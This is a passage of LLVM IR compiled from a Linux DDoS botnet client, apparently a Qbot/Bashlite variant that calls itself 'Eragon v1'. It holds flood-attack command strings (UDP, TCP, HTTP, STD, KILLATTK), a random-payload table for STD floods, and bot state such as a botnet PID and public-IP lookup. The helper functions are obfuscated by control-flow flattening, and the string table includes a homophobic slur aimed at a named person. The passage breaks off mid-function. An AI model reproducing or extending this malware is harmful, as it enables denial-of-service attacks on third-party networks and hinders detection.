@.str.129 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.132 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.133 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.134 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.135 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.136 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.137 = private unnamed_addr constant [12 x i8] c"suckmyFOUND\00", align 1
@.str.138 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.139 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.140 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.142 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.143 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.145 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.146 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.147 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.148 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.149 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.150 = private unnamed_addr constant [12 x i8] c"kadenthegod\00", align 1
@.str.151 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.151, i32 0, i32 0)], align 16
@.str.152 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.153 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@botnetPid = common global i32 0, align 4
@.str.154 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.155 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.156 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.157 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.158 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.159 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.160 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.161 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.162 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.163 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.164 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.165 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.166 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.167 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.168 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.169 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.170 = private unnamed_addr constant [37 x i8] c"\1B[96m[%s] \1B[97mConnected -> %s -> %s\00", align 1
@.str.171 = private unnamed_addr constant [10 x i8] c"Eragon v1\00", align 1
@.str.172 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@.str.173 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  store i32 %2, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1658650728, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1658650728, label %first
    i32 -1216145339, label %5
    i32 -1456699278, label %6
    i32 -2137188126, label %7
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %3 = icmp ne i32 %.reload, -1
  %4 = select i1 %3, i32 -1216145339, i32 -1456699278
  store i32 %4, i32* %switchVar
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8** %1, align 8
  store i32 -2137188126, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8** %1, align 8
  store i32 -2137188126, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %1, align 8
  ret i8* %8

loopEnd:                                          ; preds = %6, %5, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 18207409, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 18207409, label %10
    i32 -1159820958, label %14
    i32 -1132838722, label %32
    i32 -13457536, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -1159820958, i32 -13457536
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -1132838722, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 18207409, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -683647385, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -683647385, label %first
    i32 551706385, label %30
    i32 398511333, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 551706385, i32 398511333
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 398511333, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = call i64 @time(i64* null) #3
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = call i32 @getpid() #3
  %4 = call i32 @getppid() #3
  %5 = xor i32 %3, %4
  store i32 %5, i32* @y, align 4
  %6 = call i64 @clock() #3
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @z, align 4
  %9 = load i32, i32* @y, align 4
  %10 = xor i32 %8, %9
  store i32 %10, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i64 @clock() #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -871660492, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -871660492, label %5
    i32 1892971119, label %9
    i32 -1216652433, label %13
    i32 -1226219504, label %23
    i32 -1628304808, label %27
    i32 1171115637, label %39
    i32 1652421065, label %47
    i32 1566866692, label %48
    i32 -2028977213, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  %8 = select i1 %7, i32 1892971119, i32 -2028977213
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = icmp sge i32 %10, 4
  %12 = select i1 %11, i32 -1216652433, i32 -1226219504
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand_next()
  %15 = load i8*, i8** %3, align 8
  %16 = bitcast i8* %15 to i32*
  store i32 %14, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 4
  store i8* %18, i8** %3, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sext i32 %19 to i64
  %21 = sub i64 %20, 4
  %22 = trunc i64 %21 to i32
  store i32 %22, i32* %4, align 4
  store i32 1566866692, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  %26 = select i1 %25, i32 -1628304808, i32 1171115637
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @rand_next()
  %29 = and i32 %28, 65535
  %30 = trunc i32 %29 to i16
  %31 = load i8*, i8** %3, align 8
  %32 = bitcast i8* %31 to i16*
  store i16 %30, i16* %32, align 2
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 2
  store i8* %34, i8** %3, align 8
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 2
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  store i32 1652421065, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @rand_next()
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* %4, align 4
  %46 = add nsw i32 %45, -1
  store i32 %46, i32* %4, align 4
  store i32 1652421065, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1566866692, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 -871660492, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %48, %47, %39, %27, %23, %13, %9, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 1596393638, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1596393638, label %8
    i32 319025440, label %12
    i32 -43692718, label %17
    i32 110825512, label %19
    i32 692984725, label %24
    i32 -1967412244, label %40
    i32 604592879, label %43
    i32 -1670244884, label %48
    i32 -384577742, label %57
    i32 1959546493, label %58
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = select i1 %10, i32 319025440, i32 1959546493
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp uge i64 %14, 4
  %16 = select i1 %15, i32 -43692718, i32 -1670244884
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = call i32 @rand_next()
  store i32 %18, i32* %6, align 4
  store i32 0, i32* %5, align 4
  store i32 110825512, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = icmp ult i64 %21, 4
  %23 = select i1 %22, i32 692984725, i32 604592879
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %6, align 4
  %26 = and i32 %25, 255
  %27 = trunc i32 %26 to i8
  store i8 %27, i8* %7, align 1
  %28 = load i32, i32* %6, align 4
  %29 = lshr i32 %28, 8
  store i32 %29, i32* %6, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i32
  %32 = ashr i32 %31, 3
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %7, align 1
  %34 = load i8, i8* %7, align 1
  %35 = zext i8 %34 to i64
  %36 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = load i8*, i8** %3, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %3, align 8
  store i8 %37, i8* %38, align 1
  store i32 -1967412244, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  store i32 110825512, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = sub i64 %45, 4
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %4, align 4
  store i32 -384577742, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = call i32 @rand_next()
  %50 = zext i32 %49 to i64
  %51 = urem i64 %50, 32
  %52 = trunc i64 %51 to i8
  %53 = load i8*, i8** %3, align 8
  %54 = getelementptr inbounds i8, i8* %53, i32 1
  store i8* %54, i8** %3, align 8
  store i8 %52, i8* %53, align 1
  %55 = load i32, i32* %4, align 4
  %56 = add nsw i32 %55, -1
  store i32 %56, i32* %4, align 4
  store i32 -384577742, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1596393638, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %57, %48, %43, %40, %24, %19, %17, %12, %8, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -107356271, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -107356271, label %4
    i32 1258437151, label %11
    i32 -1272290159, label %14
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  %10 = select i1 %9, i32 1258437151, i32 -1272290159
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = add nsw i32 %12, 1
  store i32 %13, i32* %3, align 4
  store i32 -107356271, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  ret i32 %15

loopEnd:                                          ; preds = %11, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  %switchVar = alloca i32
  store i32 654177927, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 654177927, label %11
    i32 1329547013, label %16
    i32 766296142, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  %15 = select i1 %14, i32 1329547013, i32 766296142
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i8*, i8** %8, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %8, align 8
  %19 = load i8, i8* %17, align 1
  %20 = load i8*, i8** %7, align 8
  %21 = getelementptr inbounds i8, i8* %20, i32 1
  store i8* %21, i8** %7, align 8
  store i8 %19, i8* %20, align 1
  store i32 654177927, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 1285708905, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1285708905, label %9
    i32 -1982896649, label %13
    i32 182997483, label %18
    i32 1177407299, label %27
    i32 -1875922339, label %29
    i32 249955691, label %39
    i32 -1210218798, label %43
    i32 641673991, label %44
    i32 475386162, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -1982896649, i32 1177407299
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 182997483, i32 1177407299
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 1177407299, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -1875922339, i32 249955691
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
